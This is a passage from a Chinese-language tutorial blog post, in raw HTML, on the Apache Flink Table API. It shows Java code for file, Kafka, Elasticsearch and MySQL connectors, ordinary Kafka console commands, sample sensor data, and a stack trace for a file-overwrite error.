class="line"></span><br><span class="line">    <span class="comment">// 2. 表的创建：连接外部系统，读取数据</span></span><br><span class="line">    <span class="comment">// 读取文件</span></span><br><span class="line">    String filePath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>;</span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(filePath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Table inputTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    <span class="comment">//        inputTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(inputTable, Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 查询转换</span></span><br><span class="line">    <span class="comment">// 3.1 Table API</span></span><br><span class="line">    <span class="comment">// 简单转换</span></span><br><span class="line">    Table resultTable = inputTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 聚合统计</span></span><br><span class="line">    Table aggTable = inputTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 SQL</span></span><br><span class="line">    tableEnv.sqlQuery(<span class="string">&quot;select id, temp from inputTable where id = &#x27;senosr_6&#x27;&quot;</span>);</span><br><span class="line">    Table sqlAggTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp from inputTable group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 输出到文件</span></span><br><span class="line">    <span class="comment">// 连接外部文件注册输出表</span></span><br><span class="line">    String outputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/out.txt&quot;</span>;</span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> FileSystem().path(outputPath))</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  <span class="comment">//                        配合 aggTable.insertInto(&quot;outputTable&quot;); 才使用下面这条</span></span><br><span class="line">                  <span class="comment">//                        .field(&quot;cnt&quot;, DataTypes.BIGINT())</span></span><br><span class="line">                  .field(<span class="string">&quot;temperature&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    resultTable.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line">    <span class="comment">// 这条会报错(文件系统输出，不支持随机写，只支持附加写)</span></span><br><span class="line">    <span class="comment">// Exception in thread &quot;main&quot; org.apache.flink.table.api.TableException:</span></span><br><span class="line">    <span class="comment">// AppendStreamTableSink doesn&#x27;t support consuming update changes which is produced by</span></span><br><span class="line">    <span class="comment">// node GroupAggregate(groupBy=[id], select=[id, COUNT(id) AS EXPR$0, AVG(temp) AS EXPR$1])</span></span><br><span class="line">    <span class="comment">//        aggTable.insertInto(&quot;outputTable&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 旧版可以用下面这条</span></span><br><span class="line">    <span class="comment">//        env.execute();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新版需要用这条，上面那条会报错，报错如下</span></span><br><span class="line">    <span class="comment">// Exception in thread &quot;main&quot; java.lang.IllegalStateException:</span></span><br><span class="line">    <span class="comment">// No operators defined in streaming topology. Cannot execute.</span></span><br><span class="line">    tableEnv.execute(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出结果（输出到out.txt文件）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensor_6,15.4</span><br></pre></td></tr></table></figure></li><li><p> 这个程序只能运行一次，再运行一次报错  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; org.apache.flink.runtime.client.JobExecutionException: Job execution failed.</span><br><span class="line">at org.apache.flink.runtime.jobmaster.JobResult.toJobExecutionResult(JobResult.java:144)</span><br><span class="line">at org.apache.flink.runtime.minicluster.MiniClusterJobClient.lambda$getJobExecutionResult$2(MiniClusterJobClient.java:117)</span><br><span class="line">at java.util.concurrent.CompletableFuture.uniApply(CompletableFuture.java:616)</span><br><span class="line">at java.util.concurrent.CompletableFuture$UniApply.tryFire(CompletableFuture.java:591)</span><br><span class="line">at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:488)</span><br><span class="line">at java.util.concurrent.CompletableFuture.complete(CompletableFuture.java:1975)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaInvocationHandler.lambda$invokeRpc$0(AkkaInvocationHandler.java:238)</span><br><span class="line">at java.util.concurrent.CompletableFuture.uniWhenComplete(CompletableFuture.java:774)</span><br><span class="line">at java.util.concurrent.CompletableFuture$UniWhenComplete.tryFire(CompletableFuture.java:750)</span><br><span class="line">at java.util.concurrent.CompletableFuture.postComplete(CompletableFuture.java:488)</span><br><span class="line">at java.util.concurrent.CompletableFuture.complete(CompletableFuture.java:1975)</span><br><span class="line">at org.apache.flink.runtime.concurrent.FutureUtils$1.onComplete(FutureUtils.java:1046)</span><br><span class="line">at akka.dispatch.OnComplete.internal(Future.scala:264)</span><br><span class="line">at akka.dispatch.OnComplete.internal(Future.scala:261)</span><br><span class="line">at akka.dispatch.japi$CallbackBridge.apply(Future.scala:191)</span><br><span class="line">at akka.dispatch.japi$CallbackBridge.apply(Future.scala:188)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run(Promise.scala)</span><br><span class="line">at org.apache.flink.runtime.concurrent.Executors$DirectExecutionContext.execute(Executors.java:73)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.executeWithValue(Promise.scala:68)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1(Promise.scala:284)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.$anonfun$tryComplete$1$adapted(Promise.scala:284)</span><br><span class="line">at scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:284)</span><br><span class="line">at akka.pattern.PromiseActorRef.$bang(AskSupport.scala:573)</span><br><span class="line">at akka.pattern.PipeToSupport$PipeableFuture$$anonfun$pipeTo$1.applyOrElse(PipeToSupport.scala:22)</span><br><span class="line">at akka.pattern.PipeToSupport$PipeableFuture$$anonfun$pipeTo$1.applyOrElse(PipeToSupport.scala:21)</span><br><span class="line">at scala.concurrent.Future.$anonfun$andThen$1(Future.scala:532)</span><br><span class="line">at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29)</span><br><span class="line">at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60)</span><br><span class="line">at scala.concurrent.impl.CallbackRunnable.run(Promise.scala)</span><br><span class="line">at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55)</span><br><span class="line">at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91)</span><br><span class="line">at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12)</span><br><span class="line">at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81)</span><br><span class="line">at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91)</span><br><span class="line">at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)</span><br><span class="line">at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)</span><br><span class="line">at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)</span><br><span class="line">Caused by: org.apache.flink.runtime.JobException: Recovery is suppressed by NoRestartBackoffTimeStrategy</span><br><span class="line">at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.handleFailure(ExecutionFailureHandler.java:118)</span><br><span class="line">at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.getFailureHandlingResult(ExecutionFailureHandler.java:80)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.handleTaskFailure(DefaultScheduler.java:233)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.maybeHandleTaskFailure(DefaultScheduler.java:224)</span><br><span class="line">at org.apache.flink.runtime.scheduler.DefaultScheduler.updateTaskExecutionStateInternal(DefaultScheduler.java:215)</span><br><span class="line">at org.apache.flink.runtime.scheduler.SchedulerBase.updateTaskExecutionState(SchedulerBase.java:665)</span><br><span class="line">at org.apache.flink.runtime.scheduler.SchedulerNG.updateTaskExecutionState(SchedulerNG.java:89)</span><br><span class="line">at org.apache.flink.runtime.jobmaster.JobMaster.updateTaskExecutionState(JobMaster.java:447)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcInvocation(AkkaRpcActor.java:306)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcMessage(AkkaRpcActor.java:213)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.FencedAkkaRpcActor.handleRpcMessage(FencedAkkaRpcActor.java:77)</span><br><span class="line">at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleMessage(AkkaRpcActor.java:159)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:26)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:21)</span><br><span class="line">at scala.PartialFunction.applyOrElse(PartialFunction.scala:123)</span><br><span class="line">at scala.PartialFunction.applyOrElse$(PartialFunction.scala:122)</span><br><span class="line">at akka.japi.pf.UnitCaseStatement.applyOrElse(CaseStatements.scala:21)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172)</span><br><span class="line">at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172)</span><br><span class="line">at akka.actor.Actor.aroundReceive(Actor.scala:517)</span><br><span class="line">at akka.actor.Actor.aroundReceive$(Actor.scala:515)</span><br><span class="line">at akka.actor.AbstractActor.aroundReceive(AbstractActor.scala:225)</span><br><span class="line">at akka.actor.ActorCell.receiveMessage(ActorCell.scala:592)</span><br><span class="line">at akka.actor.ActorCell.invoke(ActorCell.scala:561)</span><br><span class="line">at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258)</span><br><span class="line">at akka.dispatch.Mailbox.run(Mailbox.scala:225)</span><br><span class="line">at akka.dispatch.Mailbox.exec(Mailbox.scala:235)</span><br><span class="line">... 4 more</span><br><span class="line">Caused by: java.io.IOException: File or directory /Users/ashiamd/mydocs/docs/study/javadocument/javadocument/IDEA_project/Flink_Tutorial/src/main/resources/out.txt already exists. Existing files and directories are not overwritten in NO_OVERWRITE mode. Use OVERWRITE mode to overwrite existing files and directories.</span><br><span class="line">at org.apache.flink.core.fs.FileSystem.initOutPathLocalFS(FileSystem.java:874)</span><br><span class="line">at org.apache.flink.core.fs.SafetyNetWrapperFileSystem.initOutPathLocalFS(SafetyNetWrapperFileSystem.java:142)</span><br><span class="line">at org.apache.flink.api.common.io.FileOutputFormat.open(FileOutputFormat.java:234)</span><br><span class="line">at org.apache.flink.api.java.io.TextOutputFormat.open(TextOutputFormat.java:92)</span><br><span class="line">at org.apache.flink.streaming.api.functions.sink.OutputFormatSinkFunction.open(OutputFormatSinkFunction.java:65)</span><br><span class="line">at org.apache.flink.api.common.functions.util.FunctionUtils.openFunction(FunctionUtils.java:34)</span><br><span class="line">at org.apache.flink.streaming.api.operators.AbstractUdfStreamOperator.open(AbstractUdfStreamOperator.java:102)</span><br><span class="line">at org.apache.flink.streaming.api.operators.StreamSink.open(StreamSink.java:46)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.OperatorChain.initializeStateAndOpenOperators(OperatorChain.java:426)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.lambda$beforeInvoke$2(StreamTask.java:535)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$1.runThrowing(StreamTaskActionExecutor.java:50)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.beforeInvoke(StreamTask.java:525)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:565)</span><br><span class="line">at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:755)</span><br><span class="line">at org.apache.flink.runtime.taskmanager.Task.run(Task.java:570)</span><br><span class="line">at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">Suppressed: java.lang.NullPointerException</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.lambda$cleanUp$1(ContinuousFileReaderOperator.java:499)</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.cleanUp(ContinuousFileReaderOperator.java:512)</span><br><span class="line">at org.apache.flink.streaming.api.functions.source.ContinuousFileReaderOperator.dispose(ContinuousFileReaderOperator.java:441)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.disposeAllOperators(StreamTask.java:783)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.runAndSuppressThrowable(StreamTask.java:762)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.cleanUpInvoke(StreamTask.java:681)</span><br><span class="line">at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:585)</span><br><span class="line">... 3 more</span><br></pre></td></tr></table></figure></li></ul><h6 id="读写Kafka"><a href="#读写Kafka" class="headerlink" title="读写Kafka"></a>读写Kafka</h6><p>Kafka作为消息队列，和文件系统类似的，只能往里追加数据，不能修改数据。</p><ul><li><p> 测试代码<br><em>（我用的新版Flink和新版kafka连接器，所以version指定”universal”）</em>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Kafka;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 6:33 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest4_KafkaPipeLine</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 连接Kafka，读取数据</span></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> Kafka()</span><br><span class="line">                     .version(<span class="string">&quot;universal&quot;</span>)</span><br><span class="line">                     .topic(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;zookeeper.connect&quot;</span>, <span class="string">&quot;localhost:2181&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>)</span><br><span class="line">                    )</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 查询转换</span></span><br><span class="line">    <span class="comment">// 简单转换</span></span><br><span class="line">    Table sensorTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    Table resultTable = sensorTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 聚合统计</span></span><br><span class="line">    Table aggTable = sensorTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 建立kafka连接，输出到不同的topic下</span></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> Kafka()</span><br><span class="line">                     .version(<span class="string">&quot;universal&quot;</span>)</span><br><span class="line">                     .topic(<span class="string">&quot;sinktest&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;zookeeper.connect&quot;</span>, <span class="string">&quot;localhost:2181&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>)</span><br><span class="line">                    )</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  <span class="comment">//                        .field(&quot;timestamp&quot;, DataTypes.BIGINT())</span></span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    resultTable.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    tableEnv.execute(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动kafka目录里自带的zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka服务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 新建kafka生产者和消费者  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic sinktest</span></span><br></pre></td></tr></table></figure></li><li><p>启动Flink程序，在kafka生产者console中输入数据，查看输出 </p><ul><li><p> 输入（kafka-console-producer）  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_7,1547718202,6.7</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_10,1547718205,38.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718209,34.5</span></span><br></pre></td></tr></table></figure></li><li><p> 输出（kafka-console-consumer）<br>代码中，只筛选id为<code>sensor_6</code>的，所以输出没有问题  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sensor_6,15.4           </span><br><span class="line"></span><br><span class="line">sensor_6,34.5</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="更新模式"><a href="#更新模式" class="headerlink" title="更新模式"></a>更新模式</h5><ul><li>对于流式查询，需要声明如何在表和外部连接器之间执行转换</li><li>与外部系统交换的消息类型，由更新模式（Uadate Mode）指定</li><li>追加（Append）模式 <ul><li>表只做插入操作，和外部连接器只交换插入（Insert）消息</li></ul></li><li>撤回（Retract）模式 <ul><li>表和外部连接器交换添加（Add）和撤回（Retract）消息</li><li>插入操作（Insert）编码为Add消息；删除（Delete）编码为Retract消息；<strong>更新（Update）编码为上一条的Retract和下一条的Add消息</strong></li></ul></li><li>更新插入（Upsert）模式 <ul><li>更新和插入都被编码为Upsert消息；删除编码为Delete消息</li></ul></li></ul><h5 id="输出到ES"><a href="#输出到ES" class="headerlink" title="输出到ES"></a>输出到ES</h5><ul><li> 可以创建Table来描述ES中的数据，作为输出的TableSink  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.connect(</span><br><span class="line">  <span class="keyword">new</span> Elasticsearch()</span><br><span class="line">  .version(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">  .host(<span class="string">&quot;localhost&quot;</span>,<span class="number">9200</span>,<span class="string">&quot;http&quot;</span>)</span><br><span class="line">  .index(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">  .documentType(<span class="string">&quot;temp&quot;</span>)</span><br><span class="line">)</span><br><span class="line">  .inUpsertMode()</span><br><span class="line">  .withFormat(<span class="keyword">new</span> Json())</span><br><span class="line">  .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">              .field(<span class="string">&quot;id&quot;</span>,DataTypes.STRING())</span><br><span class="line">              .field(<span class="string">&quot;count&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">             )</span><br><span class="line">  .createTemporaryTable(<span class="string">&quot;esOutputTable&quot;</span>);</span><br><span class="line">aggResultTable.insertInto(<span class="string">&quot;esOutputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="输出到MySQL"><a href="#输出到MySQL" class="headerlink" title="输出到MySQL"></a>输出到MySQL</h5><ul><li><p> 需要的pom依赖<br>Flink专门为Table API的jdbc连接提供了flink-jdbc连接器，需要先引入依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.flink/flink-jdbc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span 